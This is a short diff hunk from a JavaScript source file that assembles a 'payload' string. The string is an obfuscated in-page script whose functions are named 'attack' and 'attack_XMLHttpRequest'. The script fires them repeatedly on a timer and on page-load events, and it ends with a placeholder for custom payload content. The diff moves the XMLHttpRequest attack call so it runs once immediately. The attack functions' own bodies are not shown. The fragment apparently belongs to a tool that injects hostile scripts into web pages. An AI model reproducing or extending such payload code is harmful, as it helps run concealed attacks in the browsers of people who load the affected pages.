@@ -103,16 +103,14 @@ var payload,
     	"				});\n" + 
     	"			} catch(obf_var_ignore_121737){}\n" + 
     	"		}\n" + 
+        "		obf_func_attack_XMLHttpRequest_121737();\n" + 
     	"		setInterval(function(){\n" + 
     	"			obf_func_attack_121737();\n" + 
-    	"			obf_func_attack_XMLHttpRequest_121737();\n" + 
     	"		}, 666);\n" + 
     	"		try {\n" + 
     	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_121737);\n" + 
-    	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_XMLHttpRequest_121737);\n" + 
     	"		} catch(obf_var_ignore_121737){\n" + 
     	"			self.addEventListener(\"load\", obf_func_attack_121737);\n" + 
-    	"			self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest_121737);\n" + 
     	"		}\n" + 
     	"		obf_func_attack_121737();\n" + 
     	"		{{CUSTOM_PAYLOAD_TAG}}\n" + 
